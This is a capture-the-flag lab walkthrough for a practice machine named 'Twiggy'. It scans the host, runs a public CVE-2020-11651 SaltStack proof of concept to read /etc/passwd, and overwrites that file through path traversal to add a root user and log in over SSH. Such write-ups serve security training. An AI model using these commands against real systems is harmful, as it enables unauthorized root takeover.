---
icon: ubuntu
---

# Twiggy - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.194.62 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 20:14 EDT
Nmap scan report for 192.168.194.62
Host is up (0.032s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   34.27 ms 192.168.45.1
2   34.67 ms 192.168.45.254
3   35.44 ms 192.168.251.1
4   35.56 ms 192.168.194.62
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

After browsing the website on port 80, I tried default creds on the admin login page, but it was not successful.

### <mark style="color:$primary;">HTTP Port 8000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2439).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">HTTP Port 4005 & 4006 TCP ZeroMQ</mark>

I feel this is the low hanging fruit

A quick google search reveals an RCE

<figure><img src="../../.gitbook/assets/image (2440).png" alt=""><figcaption></figcaption></figure>

I found a better poc on Github here is the [**link**](https://github.com/jasperla/CVE-2020-11651-poc)

### <mark style="color:$primary;">**ZeroMQ ZMTP 2.0 RCE**</mark>

```
git clone https://github.com/jasperla/CVE-2020-11651-poc.git
```

```
python exploit.py --master 192.168.194.62 -r /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (2441).png" alt=""><figcaption></figcaption></figure>

It works not only that be we are running as root!

<figure><img src="../../.gitbook/assets/image (2443).png" alt=""><figcaption></figcaption></figure>

I used the -h parameter to see what I could do with this script. I saw that we could upload files. We can upload our own passwd file.

I can create my own root user and ssh!

Using openssl to create a hash for our password deimos123!

```
openssl passwd deimos123!
```

<figure><img src="../../.gitbook/assets/image (2442).png" alt=""><figcaption></figcaption></figure>

```
deimos:$1$iIT0aLzt$X/cFzke5BOyhn52xwIpXZ0:0:0:root:/root:/bin/bash
```

The passwd file I created

<figure><img src="../../.gitbook/assets/image (2444).png" alt=""><figcaption></figcaption></figure>

now to upload it

```
python exploit.py --master 192.168.194.62 --upload-src passwd --upload-dest ../../../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (2446).png" alt=""><figcaption></figcaption></figure>

After uploading the file, we can ssh with the username and password we created \[deimos:deimos123!]

<figure><img src="../../.gitbook/assets/image (2447).png" alt=""><figcaption></figcaption></figure>
